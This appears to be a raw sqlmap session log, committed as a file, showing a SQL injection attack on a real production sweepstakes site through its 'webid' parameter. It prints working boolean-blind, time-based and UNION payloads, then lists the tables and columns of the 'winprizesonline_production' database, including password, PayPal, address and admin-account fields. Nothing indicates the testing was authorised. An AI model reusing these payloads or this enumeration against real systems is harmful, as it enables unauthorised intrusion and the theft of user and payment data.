@@ -1,0 +1,2315 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.3.8.13#dev}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:36:15 /2019-09-24/
+
+[10:36:15] [INFO] resuming back-end DBMS 'mysql' 
+[10:36:15] [INFO] testing connection to the target URL
+[10:36:15] [INFO] heuristics detected web page charset 'ascii'
+sqlmap got a 302 redirect to 'https://toughmudder.com/win-trip-las-vegas'. Do you want to follow? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: webid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: webid=218035 AND 9938=9938
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: webid=218035 AND (SELECT 7854 FROM (SELECT(SLEEP(5)))hfxS)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: webid=218035 UNION ALL SELECT CONCAT(0x716a7a7871,0x58556645466e69414b797a75476351744c687355737a774a724e5358536f596f51474c684d546748,0x7162706271)-- RpdW
+---
+[10:36:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+[10:36:17] [INFO] fetching tables for database: 'winprizesonline_production'
+[10:36:18] [WARNING] potential permission problems detected ('Permission denied')
+[10:36:18] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[10:36:18] [INFO] used SQL query returns 104 entries
+[10:36:18] [INFO] fetching columns for table 'prizetune_search_criteria' in database 'winprizesonline_production'
+[10:36:20] [INFO] used SQL query returns 47 entries
+[10:36:20] [INFO] fetching columns for table 'period_payment' in database 'winprizesonline_production'
+[10:36:20] [INFO] fetching columns for table 'winprizes_boost' in database 'winprizesonline_production'
+[10:36:20] [INFO] fetching columns for table 'Setup_Ads' in database 'winprizesonline_production'
+[10:36:20] [INFO] fetching columns for table 'prizetune_winclub' in database 'winprizesonline_production'
+[10:36:21] [INFO] used SQL query returns 14 entries
+[10:36:21] [INFO] resumed: 'winId','int(20)'
+[10:36:21] [INFO] resumed: 'bonusprizeId','int(11)'
+[10:36:21] [INFO] resumed: 'userId','int(20)'
+[10:36:21] [INFO] resumed: 'countryId','int(10)'
+[10:36:21] [INFO] resumed: 'username','varchar(100)'
+[10:36:21] [INFO] resumed: 'prize','varchar(200)'
+[10:36:21] [INFO] resumed: 'value','int(10)'
+[10:36:21] [INFO] resumed: 'prize_desc','varchar(200)'
+[10:36:21] [INFO] resumed: 'sponsor','varchar(20)'
+[10:36:21] [INFO] resumed: 'win_status','char(2)'
+[10:36:21] [INFO] resumed: 'win_date','varchar(100)'
+[10:36:21] [INFO] resumed: 'draw_date','date'
+[10:36:21] [INFO] resumed: 'exstatus','char(1)'
+[10:36:21] [INFO] resumed: 'status','char(1)'
+[10:36:21] [INFO] fetching columns for table 'prizetune_website_form' in database 'winprizesonline_production'
+[10:36:21] [INFO] fetching columns for table 'winprizes_forum' in database 'winprizesonline_production'
+[10:36:22] [INFO] used SQL query returns 10 entries
+[10:36:22] [INFO] resumed: 'id','int(20)'
+[10:36:22] [INFO] resumed: 'userid','int(20)'
+[10:36:22] [INFO] resumed: 'date','timestamp'
+[10:36:22] [INFO] resumed: 'status','int(1)'
+[10:36:22] [INFO] resumed: 'postid','int(20)'
+[10:36:22] [INFO] resumed: 'text','varchar(1500)'
+[10:36:22] [INFO] resumed: 'username','varchar(200)'
+[10:36:22] [INFO] resumed: 'title','varchar(200)'
+[10:36:22] [INFO] resumed: 'cat','int(2)'
+[10:36:22] [INFO] resumed: 'ip','varchar(200)'
+[10:36:22] [INFO] fetching columns for table 'winprizes_advertiser' in database 'winprizesonline_production'
+[10:36:23] [INFO] used SQL query returns 8 entries
+[10:36:23] [INFO] resumed: 'id','int(20)'
+[10:36:23] [INFO] resumed: 'email','varchar(200)'
+[10:36:23] [INFO] resumed: 'name','varchar(200)'
+[10:36:23] [INFO] resumed: 'title','varchar(200)'
+[10:36:23] [INFO] resumed: 'date','timestamp'
+[10:36:23] [INFO] resumed: 'ip','varchar(100)'
+[10:36:23] [INFO] resumed: 'url','varchar(100)'
+[10:36:23] [INFO] resumed: 'status','varchar(1)'
+[10:36:23] [INFO] fetching columns for table 'categories' in database 'winprizesonline_production'
+[10:36:24] [INFO] used SQL query returns 9 entries
+[10:36:24] [INFO] resumed: 'categoryId','int(100) unsigned'
+[10:36:24] [INFO] resumed: 'OfferTypeID','int(4)'
+[10:36:24] [INFO] resumed: 'Name','varchar(200)'
+[10:36:24] [INFO] resumed: 'H1','varchar(50)'
+[10:36:24] [INFO] resumed: 'Description','varchar(1000)'
+[10:36:24] [INFO] resumed: 'ParentID','int(4)'
+[10:36:24] [INFO] resumed: 'CatNameURL','varchar(100)'
+[10:36:24] [INFO] resumed: 'IsRoot','int(11)'
+[10:36:24] [INFO] resumed: 'HeadCount','int(11)'
+[10:36:24] [INFO] fetching columns for table 'rateip' in database 'winprizesonline_production'
+[10:36:24] [INFO] fetching columns for table 'prizetune_coupon' in database 'winprizesonline_production'
+[10:36:24] [INFO] fetching columns for table 'prizetune_param' in database 'winprizesonline_production'
+[10:36:24] [INFO] fetching columns for table 'winprizes_admin_stats' in database 'winprizesonline_production'
+[10:36:25] [INFO] used SQL query returns 21 entries
+[10:36:25] [INFO] fetching columns for table 'prizetune_hided' in database 'winprizesonline_production'
+[10:36:25] [INFO] fetching columns for table 'UsersRating' in database 'winprizesonline_production'
+[10:36:25] [INFO] fetching columns for table 'prizetune_deals' in database 'winprizesonline_production'
+[10:36:27] [INFO] used SQL query returns 9 entries
+[10:36:27] [INFO] resumed: 'id','int(10) unsigned'
+[10:36:27] [INFO] resumed: 'parentid','int(10)'
+[10:36:27] [INFO] resumed: 'price','int(10)'
+[10:36:27] [INFO] resumed: 'location','varchar(15)'
+[10:36:27] [INFO] resumed: 'city','varchar(50)'
+[10:36:27] [INFO] resumed: 'state','varchar(50)'
+[10:36:27] [INFO] resumed: 'zip','int(10)'
+[10:36:27] [INFO] resumed: 'country','varchar(50)'
+[10:36:27] [INFO] resumed: 'rules','varchar(360)'
+[10:36:27] [INFO] fetching columns for table 'Ads_Domain' in database 'winprizesonline_production'
+[10:36:28] [INFO] used SQL query returns 13 entries
+[10:36:28] [INFO] resumed: 'DomainID','int(11)'
+[10:36:28] [INFO] resumed: 'MSClientID','int(11)'
+[10:36:28] [INFO] resumed: 'ExcelID','int(11)'
+[10:36:28] [INFO] resumed: 'Name','varchar(100)'
+[10:36:28] [INFO] resumed: 'TypeID','int(11)'
+[10:36:28] [INFO] resumed: 'TemplateID','int(11)'
+[10:36:28] [INFO] resumed: 'LiveStatus','int(11)'
+[10:36:28] [INFO] resumed: 'IncludeSweepstakes','int(11)'
+[10:36:28] [INFO] resumed: 'AWStatsConfigure','int(11)'
+[10:36:28] [INFO] resumed: 'IsSystem','int(11)'
+[10:36:28] [INFO] resumed: 'AccountID','int(11)'
+[10:36:28] [INFO] resumed: 'GooglePosition','int(11)'
+[10:36:28] [INFO] resumed: 'URL','varchar(500)'
+[10:36:28] [INFO] fetching columns for table 'winprizes_votes_pub' in database 'winprizesonline_production'
+[10:36:28] [INFO] fetching columns for table 'prizetune_category_name' in database 'winprizesonline_production'
+[10:36:29] [INFO] used SQL query returns 9 entries
+[10:36:29] [INFO] resumed: 'categoryId','int(100)'
+[10:36:29] [INFO] resumed: 'name','varchar(200)'
+[10:36:29] [INFO] resumed: 'details','varchar(200)'
+[10:36:29] [INFO] resumed: 'date','date'
+[10:36:29] [INFO] resumed: 'status','varchar(4)'
+[10:36:29] [INFO] resumed: 'title','varchar(100)'
+[10:36:29] [INFO] resumed: 'description','varchar(1000)'
+[10:36:29] [INFO] resumed: 'groupid','int(4)'
+[10:36:29] [INFO] resumed: 'CatNameURL','varchar(100)'
+[10:36:29] [INFO] fetching columns for table 'prizetune_user_image' in database 'winprizesonline_production'
+[10:36:29] [INFO] fetching columns for table 'winprizes_powersweeper_freetrial' in database 'winprizesonline_production'
+[10:36:29] [INFO] fetching columns for table '_domainCheck' in database 'winprizesonline_production'
+[10:36:29] [INFO] fetching columns for table 'prizetune_website' in database 'winprizesonline_production'
+[10:36:30] [INFO] used SQL query returns 43 entries
+[10:36:30] [INFO] fetching columns for table 'prizetune_contest' in database 'winprizesonline_production'
+[10:36:31] [INFO] used SQL query returns 13 entries
+[10:36:31] [INFO] resumed: 'id','int(10) unsigned'
+[10:36:31] [INFO] resumed: 'parentid','int(10)'
+[10:36:31] [INFO] resumed: 'baby','int(2)'
+[10:36:31] [INFO] resumed: 'writing','int(2)'
+[10:36:31] [INFO] resumed: 'game','int(2)'
+[10:36:31] [INFO] resumed: 'recipes','int(2)'
+[10:36:31] [INFO] resumed: 'other','int(2)'
+[10:36:31] [INFO] resumed: 'video','int(2)'
+[10:36:31] [INFO] resumed: 'location','varchar(15)'
+[10:36:31] [INFO] resumed: 'city','varchar(50)'
+[10:36:31] [INFO] resumed: 'state','varchar(50)'
+[10:36:31] [INFO] resumed: 'zip','int(10)'
+[10:36:31] [INFO] resumed: 'country','varchar(50)'
+[10:36:31] [INFO] fetching columns for table '_emails' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'ip_ban_list' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'rate' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'images' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'prizetune_country' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'stats' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'winprizes_types' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'facebook_general_info' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'winprizes_votes_prize' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'winprize_frontpage_random' in database 'winprizesonline_production'
+[10:36:31] [INFO] fetching columns for table 'winprizes_prizes' in database 'winprizesonline_production'
+[10:36:33] [INFO] used SQL query returns 10 entries
+[10:36:33] [INFO] resumed: 'id','int(200)'
+[10:36:33] [INFO] resumed: 'title','varchar(200)'
+[10:36:33] [INFO] resumed: 'desc','varchar(600)'
+[10:36:33] [INFO] resumed: 'value','varchar(200)'
+[10:36:33] [INFO] resumed: 'cat','varchar(200)'
+[10:36:33] [INFO] resumed: 'img','varchar(200)'
+[10:36:33] [INFO] resumed: 'img_tumb','varchar(200)'
+[10:36:33] [INFO] resumed: 'date','date'
+[10:36:33] [INFO] resumed: 'text','varchar(500)'
+[10:36:33] [INFO] resumed: 'type','varchar(200)'
+[10:36:33] [INFO] fetching columns for table 'Advertisement_Record' in database 'winprizesonline_production'
+[10:36:33] [INFO] fetching columns for table 'winprizes_suggest' in database 'winprizesonline_production'
+[10:36:34] [INFO] used SQL query returns 11 entries
+[10:36:34] [INFO] resumed: 'id','int(20)'
+[10:36:34] [INFO] resumed: 'username','varchar(200)'
+[10:36:34] [INFO] resumed: 'userid','int(20)'
+[10:36:34] [INFO] resumed: 'prize','varchar(200)'
+[10:36:34] [INFO] resumed: 'desc','varchar(400)'
+[10:36:34] [INFO] resumed: 'value','varchar(200)'
+[10:36:34] [INFO] resumed: 'cat','varchar(200)'
+[10:36:34] [INFO] resumed: 'image','varchar(200)'
+[10:36:34] [INFO] resumed: 'image_thump','varchar(200)'
+[10:36:34] [INFO] resumed: 'date','date'
+[10:36:34] [INFO] resumed: 'status','int(2)'
+[10:36:34] [INFO] fetching columns for table 'domain' in database 'winprizesonline_production'
+[10:36:34] [INFO] fetching columns for table 'wpo_password_reset_req' in database 'winprizesonline_production'
+[10:36:34] [INFO] fetching columns for table 'SpecialTypes' in database 'winprizesonline_production'
+[10:36:35] [INFO] used SQL query returns 12 entries
+[10:36:35] [INFO] resumed: 'categoryId','int(100) unsigned'
+[10:36:35] [INFO] resumed: 'OfferTypeID','int(4)'
+[10:36:35] [INFO] resumed: 'Name','varchar(200)'
+[10:36:35] [INFO] resumed: 'H1','varchar(50)'
+[10:36:35] [INFO] resumed: 'Description','varchar(1000)'
+[10:36:35] [INFO] resumed: 'ParentID','int(4)'
+[10:36:35] [INFO] resumed: 'CatNameURL','varchar(100)'
+[10:36:35] [INFO] resumed: 'IsRoot','int(11)'
+[10:36:35] [INFO] resumed: 'IsCheckBox','int(11)'
+[10:36:35] [INFO] resumed: 'WhereCond','varchar(500)'
+[10:36:35] [INFO] resumed: 'DateFormula','varchar(500)'
+[10:36:35] [INFO] resumed: 'HeadCount','int(11)'
+[10:36:35] [INFO] fetching columns for table 'winprizes_blog' in database 'winprizesonline_production'
+[10:36:35] [INFO] fetching columns for table 'RandTest' in database 'winprizesonline_production'
+[10:36:35] [INFO] fetching columns for table 'winprizes_bonus_entries' in database 'winprizesonline_production'
+[10:36:36] [INFO] used SQL query returns 31 entries
+[10:36:36] [INFO] fetching columns for table 'Ads_LogFile' in database 'winprizesonline_production'
+[10:36:37] [INFO] used SQL query returns 35 entries
+[10:36:37] [INFO] fetching columns for table 'create_sweeps_bank' in database 'winprizesonline_production'
+[10:36:38] [INFO] used SQL query returns 16 entries
+[10:36:38] [INFO] resumed: 'id','int(20)'
+[10:36:38] [INFO] resumed: 'publisher','int(20)'
+[10:36:38] [INFO] resumed: 'email','varchar(200)'
+[10:36:38] [INFO] resumed: 'galleryid','int(10)'
+[10:36:38] [INFO] resumed: 'form','int(1)'
+[10:36:38] [INFO] resumed: 'header','varchar(400)'
+[10:36:38] [INFO] resumed: 'password','varchar(200)'
+[10:36:38] [INFO] resumed: 'name','varchar(200)'
+[10:36:38] [INFO] resumed: 'domain','varchar(200)'
+[10:36:38] [INFO] resumed: 'date','date'
+[10:36:38] [INFO] resumed: 'status','int(1)'
+[10:36:38] [INFO] resumed: 'ip','varchar(200)'
+[10:36:38] [INFO] resumed: 'boost','int(1)'
+[10:36:38] [INFO] resumed: 'entries','int(200)'
+[10:36:38] [INFO] resumed: 'title','varchar(200)'
+[10:36:38] [INFO] resumed: 'news_text','varchar(300)'
+[10:36:38] [INFO] fetching columns for table 'user_ban_list' in database 'winprizesonline_production'
+[10:36:38] [INFO] fetching columns for table 'prizetune_winclub2' in database 'winprizesonline_production'
+[10:36:39] [INFO] used SQL query returns 14 entries
+[10:36:39] [INFO] resumed: 'winId','int(20)'
+[10:36:39] [INFO] resumed: 'bonusprizeId','int(11)'
+[10:36:39] [INFO] resumed: 'userId','int(20)'
+[10:36:39] [INFO] resumed: 'countryId','int(10)'
+[10:36:39] [INFO] resumed: 'username','varchar(100)'
+[10:36:39] [INFO] resumed: 'prize','varchar(200)'
+[10:36:39] [INFO] resumed: 'value','int(10)'
+[10:36:39] [INFO] resumed: 'prize_desc','varchar(500)'
+[10:36:39] [INFO] resumed: 'sponsor','varchar(20)'
+[10:36:39] [INFO] resumed: 'win_status','char(2)'
+[10:36:39] [INFO] resumed: 'win_date','varchar(100)'
+[10:36:39] [INFO] resumed: 'draw_date','date'
+[10:36:39] [INFO] resumed: 'exstatus','char(1)'
+[10:36:39] [INFO] resumed: 'status','char(1)'
+[10:36:39] [INFO] fetching columns for table 'wpo_powersweepercriteria' in database 'winprizesonline_production'
+[10:36:40] [INFO] used SQL query returns 13 entries
+[10:36:40] [INFO] resumed: 'userid','int(11)'
+[10:36:40] [INFO] resumed: 'minprice','int(11)'
+[10:36:40] [INFO] resumed: 'maxprice','int(11)'
+[10:36:40] [INFO] resumed: 'display','varchar(45)'
+[10:36:40] [INFO] resumed: 'sweeptype','varchar(100)'
+[10:36:40] [INFO] resumed: 'entrytype','varchar(45)'
+[10:36:40] [INFO] resumed: 'categories','varchar(200)'
+[10:36:40] [INFO] resumed: 'countries','varchar(45)'
+[10:36:40] [INFO] resumed: 'recommenduser','tinyint(4)'
+[10:36:40] [INFO] resumed: 'recommendothers','tinyint(4)'
+[10:36:40] [INFO] resumed: 'entered','tinyint(4)'
+[10:36:40] [INFO] resumed: 'notentered','tinyint(4)'
+[10:36:40] [INFO] resumed: 'updatedon','varchar(45)'
+[10:36:40] [INFO] fetching columns for table 'winprizes_ads' in database 'winprizesonline_production'
+[10:36:40] [INFO] fetching columns for table 'ItemsSpecialTypes' in database 'winprizesonline_production'
+[10:36:40] [INFO] fetching columns for table 'winprizes_publisher' in database 'winprizesonline_production'
+[10:36:41] [INFO] used SQL query returns 13 entries
+[10:36:41] [INFO] resumed: 'publisherid','int(20)'
+[10:36:41] [INFO] resumed: 'email','varchar(200)'
+[10:36:41] [INFO] resumed: 'username','varchar(200)'
+[10:36:41] [INFO] resumed: 'name','varchar(200)'
+[10:36:41] [INFO] resumed: 'password','varchar(200)'
+[10:36:41] [INFO] resumed: 'join_date','date'
+[10:36:41] [INFO] resumed: 'loginStatus','char(1)'
+[10:36:41] [INFO] resumed: 'status','char(1)'
+[10:36:41] [INFO] resumed: 'flag','enum(\\u0027Y\\u0027,\\u0027N\\u0027)'
+[10:36:41] [INFO] resumed: 'IP','varchar(10)'
+[10:36:41] [INFO] resumed: 'login','date'
+[10:36:41] [INFO] resumed: 'userid','int(20)'
+[10:36:41] [INFO] resumed: 'LinkReqired','int(11)'
+[10:36:41] [INFO] fetching columns for table 'Ads_Types' in database 'winprizesonline_production'
+[10:36:41] [INFO] fetching columns for table 'affiliate_payments' in database 'winprizesonline_production'
+[10:36:41] [INFO] fetching columns for table 'winprizes_entries' in database 'winprizesonline_production'
+[10:36:41] [INFO] fetching columns for table 'OfferTypes' in database 'winprizesonline_production'
+[10:36:42] [INFO] used SQL query returns 7 entries
+[10:36:42] [INFO] resumed: 'OfferTypeId','int(11)'
+[10:36:42] [INFO] resumed: 'OfferType','varchar(150)'
+[10:36:42] [INFO] resumed: 'CatNameURL','varchar(50)'
+[10:36:42] [INFO] resumed: 'H1Struct','varchar(50)'
+[10:36:42] [INFO] resumed: 'Description','varchar(1500)'
+[10:36:42] [INFO] resumed: 'Visible','tinyint(4)'
+[10:36:42] [INFO] resumed: 'TagTitle','varchar(450)'
+[10:36:42] [INFO] fetching columns for table 'sweepstakes_notes' in database 'winprizesonline_production'
+[10:36:42] [INFO] fetching columns for table 'winprizes_expired_data' in database 'winprizesonline_production'
+[10:36:42] [INFO] fetching columns for table 'create_sweeps_gallery' in database 'winprizesonline_production'
+[10:36:42] [INFO] fetching columns for table 'affiliate_sites' in database 'winprizesonline_production'
+[10:36:43] [INFO] used SQL query returns 8 entries
+[10:36:43] [INFO] resumed: 'publisherid','int(10)'
+[10:36:43] [INFO] resumed: 'AffiliateID','int(11)'
+[10:36:43] [INFO] resumed: 'website_name','varchar(200)'
+[10:36:43] [INFO] resumed: 'website_url','varchar(200)'
+[10:36:43] [INFO] resumed: 'traffic','int(10)'
+[10:36:43] [INFO] resumed: 'website_desc','varchar(400)'
+[10:36:43] [INFO] resumed: 'Username','varchar(100)'
+[10:36:43] [INFO] resumed: 'Password','varchar(100)'
+[10:36:43] [INFO] fetching columns for table 'prizetune_point' in database 'winprizesonline_production'
+[10:36:44] [INFO] used SQL query returns 12 entries
+[10:36:44] [INFO] resumed: 'pointId','int(8)'
+[10:36:44] [INFO] resumed: 'userId','int(8)'
+[10:36:44] [INFO] resumed: 'pointByMe','int(8)'
+[10:36:44] [INFO] resumed: 'pointByFriend','int(8)'
+[10:36:44] [INFO] resumed: 'frStatus','char(2)'
+[10:36:44] [INFO] resumed: 'totalEntries','int(8)'
+[10:36:44] [INFO] resumed: 'todayEntries','int(8)'
+[10:36:44] [INFO] resumed: 'prizes','int(8)'
+[10:36:44] [INFO] resumed: 'valueToday','int(10)'
+[10:36:44] [INFO] resumed: 'valueOfPrizeEntered','int(8)'
+[10:36:44] [INFO] resumed: 'status','char(2)'
+[10:36:44] [INFO] resumed: 'mdate','date'
+[10:36:44] [INFO] fetching columns for table 'winprizes_votes_sites' in database 'winprizesonline_production'
+[10:36:44] [INFO] fetching columns for table 'winprizes_comments' in database 'winprizesonline_production'
+[10:36:45] [INFO] used SQL query returns 13 entries
+[10:36:45] [INFO] resumed: 'text','varchar(1500)'
+[10:36:45] [INFO] resumed: 'username','varchar(200)'
+[10:36:45] [INFO] resumed: 'userid','int(20)'
+[10:36:45] [INFO] resumed: 'date','datetime'
+[10:36:45] [INFO] resumed: 'type','int(2)'
+[10:36:45] [INFO] resumed: 'status','int(1)'
+[10:36:45] [INFO] resumed: 'time','timestamp'
+[10:36:45] [INFO] resumed: 'id','int(11)'
+[10:36:45] [INFO] resumed: 'ip','varchar(200)'
+[10:36:45] [INFO] resumed: 'prizeid','int(10)'
+[10:36:45] [INFO] resumed: 'domain','varchar(200)'
+[10:36:45] [INFO] resumed: 'bloguser','varchar(200)'
+[10:36:45] [INFO] resumed: 'blogid','int(10)'
+[10:36:45] [INFO] fetching columns for table 'prizetune_group' in database 'winprizesonline_production'
+[10:36:46] [INFO] used SQL query returns 8 entries
+[10:36:46] [INFO] resumed: 'groupId','int(100) unsigned'
+[10:36:46] [INFO] resumed: 'name','varchar(200)'
+[10:36:46] [INFO] resumed: 'details','varchar(600)'
+[10:36:46] [INFO] resumed: 'date','date'
+[10:36:46] [INFO] resumed: 'status','varchar(4)'
+[10:36:46] [INFO] resumed: 'CatNameURL','varchar(100)'
+[10:36:46] [INFO] resumed: 'OfferTypeID','int(4)'
+[10:36:46] [INFO] resumed: 'H1Title','varchar(200)'
+[10:36:46] [INFO] fetching columns for table 'Affiliate_Ads' in database 'winprizesonline_production'
+[10:36:48] [INFO] used SQL query returns 26 entries
+[10:36:48] [INFO] fetching columns for table 'prizetune_user_webtrack' in database 'winprizesonline_production'
+[10:36:48] [INFO] fetching columns for table 'prizetune_friends' in database 'winprizesonline_production'
+[10:36:48] [INFO] fetching columns for table 'winprizes_titles_meta2' in database 'winprizesonline_production'
+[10:36:48] [INFO] fetching columns for table 'affiliate_publisher_extra' in database 'winprizesonline_production'
+[10:36:49] [INFO] used SQL query returns 10 entries
+[10:36:49] [INFO] resumed: 'publisherid','int(10)'
+[10:36:49] [INFO] resumed: 'website','varchar(200)'
+[10:36:49] [INFO] resumed: 'paypal','varchar(200)'
+[10:36:49] [INFO] resumed: 'address','varchar(200)'
+[10:36:49] [INFO] resumed: 'address2','varchar(200)'
+[10:36:49] [INFO] resumed: 'city','varchar(200)'
+[10:36:49] [INFO] resumed: 'area','varchar(200)'
+[10:36:49] [INFO] resumed: 'zip','varchar(200)'
+[10:36:49] [INFO] resumed: 'country','varchar(200)'
+[10:36:49] [INFO] resumed: 'phone','varchar(200)'
+[10:36:49] [INFO] fetching columns for table 'affiliate_clicks' in database 'winprizesonline_production'
+[10:36:50] [INFO] used SQL query returns 11 entries
+[10:36:50] [INFO] resumed: 'id','int(20)'
+[10:36:50] [INFO] resumed: 'publisherid','int(20)'
+[10:36:50] [INFO] resumed: 'date','date'
+[10:36:50] [INFO] resumed: 'timestamp','timestamp'
+[10:36:50] [INFO] resumed: 'ip','varchar(200)'
+[10:36:50] [INFO] resumed: 'system','varchar(200)'
+[10:36:50] [INFO] resumed: 'status','int(1)'
+[10:36:50] [INFO] resumed: 'type','int(1)'
+[10:36:50] [INFO] resumed: 'refer','varchar(200)'
+[10:36:50] [INFO] resumed: 'UserID','varchar(100)'
+[10:36:50] [INFO] resumed: 'UserCookieID','varchar(100)'
+[10:36:50] [INFO] fetching columns for table 'paypal_payment_info' in database 'winprizesonline_production'
+[10:36:51] [INFO] used SQL query returns 29 entries
+[10:36:51] [INFO] fetching columns for table 'prizetune_friend' in database 'winprizesonline_production'
+[10:36:52] [INFO] used SQL query returns 8 entries
+[10:36:52] [INFO] resumed: 'inviteId','int(8)'
+[10:36:52] [INFO] resumed: 'userId','int(8)'
+[10:36:52] [INFO] resumed: 'friendEmail','varchar(100)'
+[10:36:52] [INFO] resumed: 'message','text'
+[10:36:52] [INFO] resumed: 'inviteDate','date'
+[10:36:52] [INFO] resumed: 'acceptDate','date'
+[10:36:52] [INFO] resumed: 'joinDate','date'
+[10:36:52] [INFO] resumed: 'status','char(2)'
+[10:36:52] [INFO] fetching columns for table 'prizetune_admin' in database 'winprizesonline_production'
+[10:36:52] [INFO] fetching columns for table 'winprizes_report' in database 'winprizesonline_production'
+[10:36:54] [INFO] used SQL query returns 8 entries
+[10:36:54] [INFO] resumed: 'id','int(20)'
+[10:36:54] [INFO] resumed: 'webid','int(10)'
+[10:36:54] [INFO] resumed: 'username','varchar(200)'
+[10:36:54] [INFO] resumed: 'userid','int(10)'
+[10:36:54] [INFO] resumed: 'status','int(1)'
+[10:36:54] [INFO] resumed: 'date','timestamp'
+[10:36:54] [INFO] resumed: 'text','varchar(200)'
+[10:36:54] [INFO] resumed: 'error','varchar(100)'
+[10:36:54] [INFO] fetching columns for table 'linkaprove' in database 'winprizesonline_production'
+[10:36:54] [INFO] fetching columns for table 'prizetune_scout' in database 'winprizesonline_production'
+[10:36:54] [INFO] fetching columns for table 'AdsAccounts' in database 'winprizesonline_production'
+[10:36:55] [INFO] used SQL query returns 7 entries
+[10:36:55] [INFO] resumed: 'AccountID','int(11)'
+[10:36:55] [INFO] resumed: 'Description','varchar(45)'
+[10:36:55] [INFO] resumed: 'URL','varchar(150)'
+[10:36:55] [INFO] resumed: 'Username','varchar(45)'
+[10:36:55] [INFO] resumed: 'Password','varchar(45)'
+[10:36:55] [INFO] resumed: 'DomainSetUpID','int(11)'
+[10:36:55] [INFO] resumed: 'HostingIP','varchar(45)'
+[10:36:55] [INFO] fetching columns for table 'click_tracker_raw' in database 'winprizesonline_production'
+[10:36:56] [INFO] used SQL query returns 7 entries
+[10:36:56] [INFO] resumed: 'LineID','int(11)'
+[10:36:56] [INFO] resumed: 'DateStamp','timestamp'
+[10:36:56] [INFO] resumed: 'urls_hash','smallint(5) unsigned'
+[10:36:56] [INFO] resumed: 'urls_key','varchar(255)'
+[10:36:56] [INFO] resumed: 'urls_val','text'
+[10:36:56] [INFO] resumed: 'UserID','int(11)'
+[10:36:56] [INFO] resumed: 'UserID_Guid','varchar(100)'
+[10:36:56] [INFO] fetching columns for table 'prizetune_settings' in database 'winprizesonline_production'
+[10:36:57] [INFO] used SQL query returns 11 entries
+[10:36:57] [INFO] resumed: 'site_name','varchar(100)'
+[10:36:57] [INFO] resumed: 'site_url','varchar(100)'
+[10:36:57] [INFO] resumed: 'admin_email','varchar(100)'
+[10:36:57] [INFO] resumed: 'paypal_email','varchar(200)'
+[10:36:57] [INFO] resumed: 'prize_amt','float'
+[10:36:57] [INFO] resumed: 'exp_date','varchar(200)'
+[10:36:57] [INFO] resumed: 'duration','int(10)'
+[10:36:57] [INFO] resumed: 'copyright','varchar(100)'
+[10:36:57] [INFO] resumed: 'result','int(8)'
+[10:36:57] [INFO] resumed: 'minpoints','int(10)'
+[10:36:57] [INFO] resumed: 'popular','int(20)'
+[10:36:57] [INFO] fetching columns for table 'AdsImages' in database 'winprizesonline_production'
+[10:36:57] [INFO] fetching columns for table 'click_tracker' in database 'winprizesonline_production'
+[10:36:58] [INFO] used SQL query returns 14 entries
+[10:36:58] [INFO] resumed: 'urls_hash','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_key','varchar(255)'
+[10:36:58] [INFO] resumed: 'urls_val','text'
+[10:36:58] [INFO] resumed: 'urls_total','bigint(20) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt0','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt1','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt2','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt3','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt4','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt5','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt6','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt7','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt8','smallint(5) unsigned'
+[10:36:58] [INFO] resumed: 'urls_cnt9','smallint(5) unsigned'
+[10:36:58] [INFO] fetching columns for table 'prizetune_saved' in database 'winprizesonline_production'
+[10:36:58] [INFO] fetching columns for table 'tmp_prizetune_group' in database 'winprizesonline_production'
+[10:36:59] [INFO] used SQL query returns 8 entries
+[10:36:59] [INFO] resumed: 'groupId','int(100) unsigned'
+[10:36:59] [INFO] resumed: 'name','varchar(200)'
+[10:36:59] [INFO] resumed: 'details','varchar(600)'
+[10:36:59] [INFO] resumed: 'date','date'
+[10:36:59] [INFO] resumed: 'status','varchar(4)'
+[10:36:59] [INFO] resumed: 'CatNameURL','varchar(100)'
+[10:36:59] [INFO] resumed: 'OfferTypeID','int(4)'
+[10:36:59] [INFO] resumed: 'H1Title','varchar(200)'
+[10:36:59] [INFO] fetching columns for table 'prizetune_bonus' in database 'winprizesonline_production'
+[10:37:00] [INFO] used SQL query returns 17 entries
+[10:37:00] [INFO] resumed: 'bonusId','int(8)'
+[10:37:00] [INFO] resumed: 'userId','int(8)'
+[10:37:00] [INFO] resumed: 'username','varchar(200)'
+[10:37:00] [INFO] resumed: 'jan','int(10)'
+[10:37:00] [INFO] resumed: 'feb','int(10)'
+[10:37:00] [INFO] resumed: 'mar','int(10)'
